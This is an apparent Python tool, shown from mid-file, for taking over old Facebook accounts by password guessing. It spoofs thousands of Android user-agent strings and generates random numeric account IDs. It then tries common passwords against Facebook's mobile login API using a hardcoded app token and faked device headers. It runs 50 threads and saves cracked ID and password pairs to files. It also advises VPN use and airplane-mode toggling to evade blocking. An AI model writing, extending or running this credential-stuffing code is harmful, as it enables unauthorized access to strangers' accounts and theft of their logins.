   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 5.1;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['GT-810 Build/LMY47I'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/66.0.3359.106 Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; U; Android 2.2;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='fr-fr; Desire_A8181 Build/'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l=' 4.0 Mobile Safari/533.1'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (SMART-TV;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='Linux; Tizen 2.4.0)'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Safari/538.1'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; U; Android 2.3.6;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='fr-fr; GT-S5839i Build/'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g=' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='4.0 Mobile Safari/534.30'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 4.0.4;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='LT30p Build/'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='18.0.1025.166 Mobile Safari/535.19'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['CPH1969 Build/RP1A.200720.011; wv)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):
   aa='Mozilla/5.0 (Linux; Android 7.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Redmi Note 4 Build/NRD90M)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/63.0.3239.111 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Redmi Note 9 Pro'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['ASUS_I005DA)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/102.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 10;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Vivo Y91C)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/98.0.4711.185 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
   
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['M2012K11AG Build/'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Vivo Y91C)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/97.0.4740.200 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 8.1.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['CPH1909 Build/O11019 )'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
import os
os.system('clear')
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
logo=(f"""{A}
{BB}d8888b.    d88b      .d8888. db   db db    db db    db  .d88b.  
{G}88  `8D    `8P'      88'  YP 88   88 88    88 88    88 .8P  Y8. 
{XX}88oobY'     88       `8bo.   88ooo88 88    88 Y8    8P 88    88 
{G}88`8b       88         `Y8b. 88~~~88 88    88 `8b  d8' 88    88 
{X1}88 `88. db. 88       db   8D 88   88 88b  d88  `8bd8'  `8b  d8' 
{X2}88   YD Y8888P       `8888Y' YP   YP ~Y8888P'    YP     `Y88P'  {R}❲{G}V{R}/{G}1.0.5{R}❳

{XX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}❲{G}~{R}❳{G} DEVELOPER    {R}:{G} RJ SHUVO
{R}❲{G}~{R}❳{G} FACEBOOK     {R}:{G} RS SHUVO
{R}❲{G}~{R}❳{G} GROUP        {R}:{G} RJ COMMAND WORLD
{R}❲{G}~{R}❳{G} GITHUB       {R}:{G} RJ-Shuvo
{R}❲{G}~{R}❳{G} TOOLS        {R}:{G} RNDM X FILE X GMAIL ETC
{R}❲{G}~{R}❳{G} STATUS       {R}:{G} PREMIUM 
{R}❲{G}~{R}❳{G} VERSION      {R}:{G} RJ-GREEN-MAX
{XX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""") 
def line():
        print(f'{XX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{XX}')
        
class OLD_CLONER:
    def __init__(self):
        self.loop = 0 
        self.oks = []
        self.cps = []
        self.gen = []
    
    def banner(self):
        os.system("clear")
        print(logo)
    
    def main(self):
        self.banner()
        print(f'\x1b[1;92m {XX}[\x1b[1;92m01{XX}]\x1b[38;5;46m CRACK 2009')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m02{XX}]\x1b[38;5;46m CRACK 2010')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m03{XX}]\x1b[38;5;46m CRACK 2008')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m04{XX}]\x1b[38;5;46m CRACK 2007')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m05{XX}]\x1b[38;5;46m CRACK 2006')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m06{XX}]\x1b[38;5;46m CRACK 2005')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m07{XX}]\x1b[38;5;46m CRACK 2004')
        line()
        select = input(f'{XX}[{G}√{XX}]{G} CHOICE \33[1;97m: \33[1;96m')
        if select == "1":self.oldClone("2009")
        elif select == "2":self.oldClone("2010")
        elif select == "3":self.oldClone("2008")
        elif select == "4":self.oldClone("2007")
        elif select == "5":self.oldClone("2006")
        elif select == "6":self.oldClone("2005")
        elif select == "7":self.oldClone("2004")
        else:self.main()
    
    def oldClone(self,series):
        self.banner()
        if series == "2009":
            self.uX = "100000"
            self.uG = 9
        elif series == "2010":
            self.uX = "10000"
            self.uG = 10
        elif series == "2008":
            self.uX = ""
            self.uG = 10
        elif series == "2007":
            self.uX = ""
            self.uG = 8
        elif series == "2006":
            self.uX = ""
            self.uG = 7
        elif series == "2005":
            self.uX = ""
            self.uG = 6
        elif series == "2004":
            self.uX = ""
            self.uG = 5
        else:
            self.uX = "100000"
            self.uG = 9
        print(f'\x1b[1;92m {XX}[\x1b[1;92m√{XX}]\x1b[38;5;46m EXAMPLE : {G}2000  {G}3000  {G}4000 {G}5000');line()
        limit = int(input(f'\x1b[1;92m {XX}[\x1b[1;92m√{XX}]\x1b[38;5;46m SELECT : '))
        for a in range(limit):
            RJSHUVO = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(RJSHUVO)
        with ThreadPoolExecutor(max_workers=50) as Mr_Code:
            self.banner()
            print(f"\x1b[1;92m {XX}[\x1b[1;92m√{XX}]\x1b[38;5;46m TOTAL IDS {XX}:{G} "+str(len(self.gen)))
            print(f'\x1b[1;92m {XX}[\x1b[1;92m√{XX}]\x1b[38;5;46m CRACK SERIES {XX}:{G} '+series)
            print(f'\x1b[1;92m {XX}[\x1b[1;92m√{XX}]\x1b[38;5;46m USE VPN 1111 WHEN YOU RUN ')
            print(f'\x1b[1;92m {XX}[\x1b[1;92m√{XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE \x1b[1;92m{XX}[\x1b[1;92mOLD CLONING{XX}]')
            line()
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "123123","112233", "1234567890", "password", "@@@###"]
                Mr_Code.submit(self.CloneOld,ids,passlist)
        sys.exit("\n-------------------------------")
    
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r{XX}[{G}RJ-XD-OLD{XX}]{G} × {self.loop} × {XX}[{G}OK{XX}]{G} × {len(self.oks)}")
        sys.stdout.flush()
        pro=random.choice(ugen)
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'cpl':'true',
                'credentials_type':'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type':'button_with_disabled',
                'format':'json',
                'generate_session_cookies':'1',
                'generate_analytics_claim':'1',
                'generate_machine_id':'1',
                "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "locale":"en_US","client_country_code":"US",
                "device_id": str(uuid.uuid4()),
                "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                head = {
                'content-type':'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'x-fb-sim-hni':str(random.randint(20000,40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent':pro,
                'x-fb-net-hni':str(random.randint(20000,40000)),
                'x-fb-device-group': '5120',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),
                'x-fb-connection-quality':'EXCELLENT',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'x-fb-friendly-name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'accept-encoding':'gzip, deflate',
                'x-fb-http-engine':'Liger'}
                url = "https://b-graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head,verify=True).json()
                if "access_token" in response:
                    print(f"\r\r{XX}[{G}RJ-SHUVO-OK{XX}]{G} ~ {ids} ~ {pas}")
                    open("/sdcard/RJSHUVO-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r{XX}[{G}RJ-SHUVO-OK{XX}]{G} ~ {ids} ~ {pas}")
                    open("/sdcard/RJSHUVO-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass

if __name__ == "__main__":
    OLD_CLONER().main()